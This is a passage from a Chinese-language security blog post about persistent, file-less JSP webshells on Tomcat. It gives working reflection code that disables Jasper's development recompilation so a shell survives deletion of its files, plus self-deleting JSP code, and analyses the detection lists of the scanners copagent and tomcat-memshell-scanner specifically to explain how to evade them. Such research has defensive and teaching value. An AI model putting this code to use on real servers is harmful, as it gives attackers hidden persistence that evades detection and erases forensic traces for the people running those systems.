<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">   &lt;%</span><br><span class="line">	<span class="comment">//从request对象中获取request属性</span></span><br><span class="line">	Field requestF = request.getClass().getDeclaredField(<span class="string">"request"</span>);</span><br><span class="line">    requestF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) requestF.get(request);</span><br><span class="line">	<span class="comment">//获取MappingData</span></span><br><span class="line">    MappingData mappingData = req.getMappingData();</span><br><span class="line">	<span class="comment">//获取Wrapper</span></span><br><span class="line">    Field wrapperF = mappingData.getClass().getDeclaredField(<span class="string">"wrapper"</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">  	<span class="comment">//获取jspServlet对象</span></span><br><span class="line">    Field instanceF = wrapper.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Servlet jspServlet = (Servlet) instanceF.get(wrapper);</span><br><span class="line">	<span class="comment">//获取options中保存的对象 </span></span><br><span class="line">	Field Option = jspServlet.getClass().getDeclaredField(<span class="string">"options"</span>);</span><br><span class="line">    Option.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    EmbeddedServletOptions op = (EmbeddedServletOptions) Option.get(jspServlet);</span><br><span class="line">	<span class="comment">//设置development属性为false</span></span><br><span class="line">	Field Developent = op.getClass().getDeclaredField(<span class="string">"development"</span>);</span><br><span class="line">	Developent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	Developent.set(op,<span class="keyword">false</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​    既然已经分析好了，我们做一个测试，<strong>当我们第二次请求我们的脚本<code>development</code>的属性值已经被改为false,即使我们删除对应的<code>jsp\java\Class</code>文件，仍然还可以还可以正常请求shell。</strong></p>
<p><img src="/2021/10/14/JSP%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211014172139021.png" alt="image-20211014172139021"></p>
<p>​    <strong>那么经过修改后会不会导致后来上传的jsp文件都无法执行的问题呢？</strong></p>
<p>​    不会，因为每一个JSP文件，只有已经编译并且注册为Servlet后，<code>mustCompile</code>属性才会为False，默认为True，并且<code>mustCompile</code>也是由<code>volatile</code>修饰并且在<code>synchronized</code>加锁的代码块中，只有同一个<code>jspServletWrapper</code>的<code>mustCompile</code>的修改在下次请求时还有效。当然也不是说完全没有影响，<strong>如果我们想修改一个已经加载为<code>Servlet</code>的JSP文件，即使修改了也不会生效。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">               <span class="keyword">synchronized</span> (<span class="keyword">this</span>) &#123;</span><br><span class="line">                   <span class="keyword">if</span> (options.getDevelopment() || mustCompile) &#123;</span><br><span class="line">                       ctxt.compile();</span><br><span class="line">                       mustCompile = <span class="keyword">false</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure>

<h3 id="绕过方法二"><a href="#绕过方法二" class="headerlink" title="绕过方法二"></a>绕过方法二</h3><p>下一个我们有机会绕过的点在compile中，如果我们能让<code>isOutDated</code>返回false，也可以达到绕过的目的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException </span>&#123;</span><br><span class="line">       createCompiler();</span><br><span class="line">       <span class="keyword">if</span> (jspCompiler.isOutDated()) &#123;</span><br><span class="line">        ...</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>注意看下面的代码,在<code>isOutDated</code>中，当满足下面的条件则会返回false。<code>jsw</code>中保存的是<code>jspServletWarpper</code>对象，所以是不为null的，并且<code>modificationTestInterval</code>默认值是4也满足条件，所以我们现在要做的就是让<code>modificationTestInterval*1000</code>大于<code>System.currentTimeMillis()</code>,所以<strong>只要将<code>modificationTestInterval</code>修改为一个比较大的值也可以达到绕过的目的。</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isOutDated</span><span class="params">(<span class="keyword">boolean</span> checkClass)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (jsw != <span class="keyword">null</span></span><br><span class="line">              &amp;&amp; (ctxt.getOptions().getModificationTestInterval() &gt; <span class="number">0</span>)) &#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (jsw.getLastModificationTest()</span><br><span class="line">                  + (ctxt.getOptions().getModificationTestInterval() * <span class="number">1000</span>) &gt; System.currentTimeMillis()) &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>​    <code>modificationTestInterval</code>也保存在<code>options</code>属性中，所以修改的方法和方法一类似，就不罗列代码了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">EmbeddedServletOptions</span> <span class="keyword">implements</span> <span class="title">Options</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">int</span> modificationTestInterval = <span class="number">4</span>;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="查杀情况分析"><a href="#查杀情况分析" class="headerlink" title="查杀情况分析"></a>查杀情况分析</h2><h3 id="tomcat-memshell-scanner"><a href="#tomcat-memshell-scanner" class="headerlink" title="tomcat-memshell-scanner"></a>tomcat-memshell-scanner</h3><p>​    这款工具会Dump出所有保存在<code>servletMappings</code>中的<code>Servlet</code>的信息，不过我们的JSPServlet并没有保存在<code>servletMappings</code>中，而是在<code>JspRuntimeContext#jsps</code>字段中，因此根本查不到。</p>
<p><img src="/2021/10/14/JSP%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211014182211891.png" alt="image-20211014182211891"></p>
<p><img src="/2021/10/14/JSP%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211014182226154.png" alt="image-20211014182226154"></p>
<h3 id="copagent"><a href="#copagent" class="headerlink" title="copagent"></a>copagent</h3><p>​    JSP本质上也就是<code>Servlet</code>，编译好的Class继承了<code>HttpJspBase</code>，类图如下所示。</p>
<p><img src="/2021/10/14/JSP%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211015101038935.png" alt="image-20211015101038935"></p>
<h4 id="copagent流程分析"><a href="#copagent流程分析" class="headerlink" title="copagent流程分析"></a>copagent流程分析</h4><p>​    <code>copagent</code>首先获取所有已经加载的类，并创建了几个数组。</p>
<ul>
<li><code>riskSuperClassesName</code>中保存了<code>HttpServlet</code>，用于获取Servlet，因为我们注册的Servlet会直接或者间接继承<code>HttpServlet</code></li>
<li><code>riskPackage</code>保存了一些恶意的包名，比如冰蝎的包名为<code>net.rebeyond</code>，使用冰蝎连接webshell时会将自己的恶意类加载到内存，而这个恶意类也是以<code>net.rebeyond</code>为包名的</li>
<li><code>riskAnnotations</code>保存了SpringMVC中注解注册Controller的类型，显然是为了抓出所有SpringMVC中通过注解注册的Controller</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">catchThief</span><span class="params">(String name, Instrumentation ins)</span></span>&#123;</span><br><span class="line">   ...</span><br><span class="line">        List&lt;Class&lt;?&gt;&gt; resultClasses = <span class="keyword">new</span> ArrayList&lt;Class&lt;?&gt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获得所有已加载的类及类名</span></span><br><span class="line">        Class&lt;?&gt;[] loadedClasses = ins.getAllLoadedClasses();</span><br><span class="line">        LogUtils.logit(<span class="string">"Found All Loaded Classes    : "</span> + loadedClasses.length);</span><br><span class="line">        List&lt;String&gt; loadedClassesNames = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        <span class="keyword">for</span>(Class&lt;?&gt; cls: loadedClasses)&#123;</span><br><span class="line">            loadedClassesNames.add(cls.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   ...</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 实现的可能具有 web shell 功能的父类名</span></span><br><span class="line">        List&lt;String&gt; riskSuperClassesName = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        riskSuperClassesName.add(<span class="string">"javax.servlet.http.HttpServlet"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 黑名单拦截</span></span><br><span class="line">        List&lt;String&gt; riskPackage = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        riskPackage.add(<span class="string">"net.rebeyond."</span>);</span><br><span class="line">        riskPackage.add(<span class="string">"com.metasploit."</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 风险注解</span></span><br><span class="line">        List&lt;String&gt; riskAnnotations = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        riskAnnotations.add(<span class="string">"org.springframework.stereotype.Controller"</span>);</span><br><span class="line">      riskAnnotations.add(<span class="string">"org.springframework.web.bind.annotation.RestController"</span>);      riskAnnotations.add(<span class="string">"org.springframework.web.bind.annotation.RequestMapping"</span>);</span><br><span class="line">        riskAnnotations.add(<span class="string">"org.springframework.web.bind.annotation.GetMapping"</span>);</span><br><span class="line">        riskAnnotations.add(<span class="string">"org.springframework.web.bind.annotation.PostMapping"</span>);</span><br><span class="line">        riskAnnotations.add(<span class="string">"org.springframework.web.bind.annotation.PatchMapping"</span>);</span><br><span class="line">        riskAnnotations.add(<span class="string">"org.springframework.web.bind.annotation.PutMapping"</span>);</span><br><span class="line">        riskAnnotations.add(<span class="string">"org.springframework.web.bind.annotation.Mapping"</span>);</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>​        下面代码完成主要的检测逻辑，首先会检测包名和SpringMVC注解的类，检测到则添加到<code>resultClasses</code>中，并且修改<code>not_found</code>标志位为False，表示不检测<code>Servelt/Filter/Listener</code>类型的shell。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span>(Class&lt;?&gt; clazz: loadedClasses)&#123;</span><br><span class="line">               Class&lt;?&gt; target = clazz;</span><br><span class="line">               <span class="keyword">boolean</span> not_found = <span class="keyword">true</span>;</span><br><span class="line">     <span class="comment">//检测包名是否为恶意包名，如果是则设置not_found为false，代表已经被shell连接过了，跳过后面Servlet和Filter内存马部分的检测并Dump出恶意类的信息。</span></span><br><span class="line">               <span class="keyword">for</span>(String packageName: riskPackage)&#123;</span><br><span class="line">                   <span class="keyword">if</span>(clazz.getName().startsWith(packageName))&#123;</span><br><span class="line">                       resultClasses.add(clazz);</span><br><span class="line">                       not_found = <span class="keyword">false</span>;</span><br><span class="line">                       ClassUtils.dumpClass(ins, clazz.getName(), <span class="keyword">false</span>, Integer.toHexString(target.getClassLoader().hashCode()));</span><br><span class="line">                       <span class="keyword">break</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line"><span class="comment">//判断是否使用SpringMVC的注解注册Controller，如果是则Dump出使用注解的Controller的类的信息</span></span><br><span class="line">               <span class="keyword">if</span>(ClassUtils.isUseAnnotations(clazz, riskAnnotations))&#123;</span><br><span class="line">                   resultClasses.add(clazz);</span><br><span class="line">                   not_found = <span class="keyword">false</span>;</span><br><span class="line">                   ClassUtils.dumpClass(ins, clazz.getName(), <span class="keyword">false</span>, Integer.toHexString(target.getClassLoader().hashCode()));</span><br><span class="line">               &#125;</span><br><span class="line">     <span class="comment">//检测Servelt/Filter/Listener类型Webshell</span></span><br><span class="line">     <span class="keyword">if</span>(not_found)&#123;</span><br><span class="line">                   <span class="comment">// 递归查找</span></span><br><span class="line">                   <span class="keyword">while</span> (target != <span class="keyword">null</span> &amp;&amp; !target.getName().equals(<span class="string">"java.lang.Object"</span>))&#123;</span><br><span class="line">                       <span class="comment">// 每次都重新获得目标类实现的所有接口</span></span><br><span class="line">                       interfaces = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                       <span class="keyword">for</span>(Class&lt;?&gt; cls: target.getInterfaces())&#123;</span><br><span class="line">                           interfaces.add(cls.getName());</span><br><span class="line">                       &#125;</span><br><span class="line">                       <span class="keyword">if</span>( <span class="comment">// 继承危险父类的目标类</span></span><br><span class="line">                               (target.getSuperclass() != <span class="keyword">null</span> &amp;&amp; riskSuperClassesName.contains(target.getSuperclass().getName())) ||</span><br><span class="line">                                       <span class="comment">// 实现特殊接口的目标类</span></span><br><span class="line">                                       target.getName().equals(<span class="string">"org.springframework.web.servlet.handler.AbstractHandlerMapping"</span>) ||</span><br><span class="line">                                       interfaces.contains(<span class="string">"javax.servlet.Filter"</span>) ||</span><br><span class="line">                                       interfaces.contains(<span class="string">"javax.servlet.Servlet"</span>) ||</span><br><span class="line">                                       interfaces.contains(<span class="string">"javax.servlet.ServletRequestListener"</span>)</span><br><span class="line">                       )</span><br><span class="line">                       &#123;</span><br><span class="line">    ...</span><br><span class="line">                           <span class="keyword">if</span>(loadedClassesNames.contains(clazz.getName()))&#123;</span><br><span class="line">                               resultClasses.add(clazz);</span><br><span class="line">                               ClassUtils.dumpClass(ins, clazz.getName(), <span class="keyword">false</span>, Integer.toHexString(clazz.getClassLoader().hashCode()));</span><br><span class="line">                           &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                              ...</span><br><span class="line">                           &#125;</span><br><span class="line">                           <span class="keyword">break</span>;</span><br><span class="line">                       &#125;</span><br><span class="line">                       target = target.getSuperclass();</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br></pre></td></tr></table></figure>

<p>​    我们主要关注<code>Servlet</code>的检测，首先获取当前Class的实现接口，如果Class的父类不为空并且父类不是<code>HttpServlet</code>，并且没有实现<code>Serlvet\Filter\ServletRequestListener</code>等接口则不会被添加到<code>resultClasses</code>但会递归的去检查父类。由于JSP文件实际继承了<code>HttpJspBase</code>，相当于间接继承了<code>HttpServlet</code>，所以是绕不过这里的检查的，不过没关系，这一步只是检查是否是Servlet，并不代表被检测出来了。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (target != <span class="keyword">null</span> &amp;&amp; !target.getName().equals(<span class="string">"java.lang.Object"</span>))&#123;</span><br><span class="line">                     <span class="comment">// 每次都重新获得目标类实现的所有接口</span></span><br><span class="line">                     interfaces = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">                     <span class="keyword">for</span>(Class&lt;?&gt; cls: target.getInterfaces())&#123;</span><br><span class="line">                         interfaces.add(cls.getName());</span><br><span class="line">                     &#125;</span><br><span class="line">                     <span class="keyword">if</span>( <span class="comment">// 继承危险父类的目标类</span></span><br><span class="line">                             (target.getSuperclass() != <span class="keyword">null</span> &amp;&amp; riskSuperClassesName.contains(target.getSuperclass().getName())) ||</span><br><span class="line">                                     <span class="comment">// 实现特殊接口的目标类</span></span><br><span class="line">                                     target.getName().equals(<span class="string">"org.springframework.web.servlet.handler.AbstractHandlerMapping"</span>) ||interfaces.contains(<span class="string">"javax.servlet.Filter"</span>) ||interfaces.contains(<span class="string">"javax.servlet.Servlet"</span>) ||interfaces.contains(<span class="string">"javax.servlet.ServletRequestListener"</span>)</span><br><span class="line">                     )</span><br><span class="line">                     &#123;</span><br><span class="line">                         <span class="keyword">if</span>(loadedClassesNames.contains(clazz.getName()))&#123;</span><br><span class="line">                             resultClasses.add(clazz);</span><br><span class="line">                             ClassUtils.dumpClass(ins, clazz.getName(), <span class="keyword">false</span>, Integer.toHexString(clazz.getClassLoader().hashCode()));</span><br><span class="line">                         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                             LogUtils.logit(<span class="string">"cannot find "</span> + clazz.getName() + <span class="string">" classes in instrumentation"</span>);</span><br><span class="line">                         &#125;</span><br><span class="line">                         <span class="keyword">break</span>;</span><br><span class="line">                   ...</span><br><span class="line">                     &#125;</span><br><span class="line">                     target = target.getSuperclass();</span><br><span class="line">                 &#125;</span><br></pre></td></tr></table></figure>

<p>​    下面是判断是否为恶意内容的核心，只有当<code>resultClasses</code>中包含了关键下面的关键字才会被标记为high，这里如果我们使用自定义马的话也是可以绕过的，但是如果要使用冰蝎,一定会被<code>javax.crypto.</code>加密包的规则检测到，如果是自定义加密算法也是可以绕过的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> List&lt;String&gt; riskKeyword = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">        riskKeyword.add(<span class="string">"javax.crypto."</span>);</span><br><span class="line">        riskKeyword.add(<span class="string">"ProcessBuilder"</span>);</span><br><span class="line">        riskKeyword.add(<span class="string">"getRuntime"</span>);</span><br><span class="line">        riskKeyword.add(<span class="string">"shell"</span>);</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">for</span>(Class&lt;?&gt; clazz: resultClasses)&#123;</span><br><span class="line">            File dumpPath = PathUtils.getStorePath(clazz, <span class="keyword">false</span>);</span><br><span class="line">            String level = <span class="string">"normal"</span>;</span><br><span class="line">            String content = PathUtils.getFileContent(dumpPath);</span><br><span class="line">            <span class="keyword">for</span>(String keyword: riskKeyword)&#123;</span><br><span class="line">                <span class="keyword">if</span>(content.contains(keyword))&#123;</span><br><span class="line">                    level = <span class="string">"high"</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>

<h2 id="自删除"><a href="#自删除" class="headerlink" title="自删除"></a>自删除</h2><p>​    上面只是分析了如何让我们的JSP在删除了<code>JSP\java\Class</code>文件后还能访问，下面我们分析如何在<code>JSP</code>中实现删除<code>JSP\java\Class</code>文件，在<code>JspCompilationContext</code>保存着JSP编译的上下文信息，我们可以从中拿到<code>java/class</code>的绝对路径。</p>
<p><img src="/2021/10/14/JSP%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211015134529214.png" alt="image-20211015134529214"></p>
<p>​    而<code>JspCompilationContext</code>对象保存在<code>JspServletWrapper</code>中，所以要先获取<code>JspServletWrapper</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">JspServletWrapper</span><span class="params">(ServletConfig config, Options options,</span></span></span><br><span class="line"><span class="function"><span class="params">          String jspUri, JspRuntimeContext rctxt)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">      ctxt = <span class="keyword">new</span> JspCompilationContext(jspUri, options,</span><br><span class="line">                                       config.getServletContext(),</span><br><span class="line">                                       <span class="keyword">this</span>, rctxt);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p><code>request.request.getMappingData().wrapper.instance.rctxt.jsps.get(&quot;/jsp.jsp&quot;)</code></p>
<p><img src="/2021/10/14/JSP%E5%86%85%E5%AD%98%E9%A9%AC%E7%A0%94%E7%A9%B6/image-20211015140030633.png" alt="image-20211015140030633"></p>
<p>​    下面是代码实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">   &lt;%</span><br><span class="line">	<span class="comment">//从request对象中获取request属性</span></span><br><span class="line">	Field requestF = request.getClass().getDeclaredField(<span class="string">"request"</span>);</span><br><span class="line">    requestF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) requestF.get(request);</span><br><span class="line">	<span class="comment">//获取MappingData</span></span><br><span class="line">    MappingData mappingData = req.getMappingData();</span><br><span class="line">	<span class="comment">//获取Wrapper，这里的Wrapper是StandrardWrapper</span></span><br><span class="line">    Field wrapperF = mappingData.getClass().getDeclaredField(<span class="string">"wrapper"</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Wrapper wrapper = (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">  	<span class="comment">//获取jspServlet对象</span></span><br><span class="line">    Field instanceF = wrapper.getClass().getDeclaredField(<span class="string">"instance"</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Servlet jspServlet = (Servlet) instanceF.get(wrapper);</span><br><span class="line">	<span class="comment">//获取rctxt属性</span></span><br><span class="line">	Field rctxt = jspServlet.getClass().getDeclaredField(<span class="string">"rctxt"</span>);</span><br><span class="line">    rctxt.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">	JspRuntimeContext jspRuntimeContext = (JspRuntimeContext) rctxt.get(jspServlet);</span><br><span class="line">	<span class="comment">//获取jsps属性内容</span></span><br><span class="line">	Field jspsF = jspRuntimeContext.getClass().getDeclaredField(<span class="string">"jsps"</span>);</span><br><span class="line">    jspsF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ConcurrentHashMap jsps = (ConcurrentHashMap) jspsF.get(jspRuntimeContext);</span><br><span class="line">	<span class="comment">//获取对应的JspServletWrapper</span></span><br><span class="line">    JspServletWrapper jsw = (JspServletWrapper)jsps.get(request.getServletPath());</span><br><span class="line">	<span class="comment">//获取ctxt属性保存的JspCompilationContext对象</span></span><br><span class="line">	Field ctxt = jsw.getClass().getDeclaredField(<span class="string">"ctxt"</span>);</span><br><span class="line">    ctxt.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    JspCompilationContext jspCompContext = (JspCompilationContext) ctxt.get(jsw);</span><br><span class="line">    File targetFile;</span><br><span class="line">    targetFile = <span class="keyword">new</span> File(jspCompContext.getClassFileName());<span class="comment">//删掉jsp的.class</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">    targetFile = <span class="keyword">new</span> File(jspCompContext.getServletJavaFileName());<span class="comment">//删掉jsp的java文件</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">	<span class="comment">//删除JSP文件</span></span><br><span class="line"> 	String __jspName = <span class="keyword">this</span>.getClass().getSimpleName().replaceAll(<span class="string">"_"</span>, <span class="string">"."</span>);</span><br><span class="line">    String path=application.getRealPath(__jspName);</span><br><span class="line">    File file = <span class="keyword">new</span> File(path);</span><br><span class="line">    file.delete();</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>​    最后有个不兼容的小BUG，tomcat7和8/9的<code>MappingData</code>类包名发生了变化</p>
<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat7:&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.tomcat.util.http.mapper.MappingData"</span> %&gt;</span><br><span class="line">tomcat8/<span class="number">9</span>:&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.mapper.MappingData"</span> %&gt;</span><br></pre></td></tr></table></figure>

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>​    虽然不能使用冰蝎等webshell绕过这两款工具的检测，但是当我们了解了查杀原理，将自己的webshell稍微改一下，也是可以绕过的，最后这篇文章来自于参考<a href="https://www.anquanke.com/post/id/224698" target="_blank" rel="noopener">Tomcat容器攻防笔记之JSP金蝉脱壳</a>文章的实践，感谢前辈。</p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/内存马/">内存马</a>
    </span>
    

    

    </div>

    
  </div>
</article>

  






    </main>

    <footer class="site-footer">
  <p class="site-info">
    Proudly powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and
    Theme by <a href="https://github.com/CodeDaraW/Hacker" target="_blank">Hacker</a>
    </br>
    
    &copy; 2021 藏青
    
  </p>
</footer>
    
    
  </div>
</div>
</body>
</html>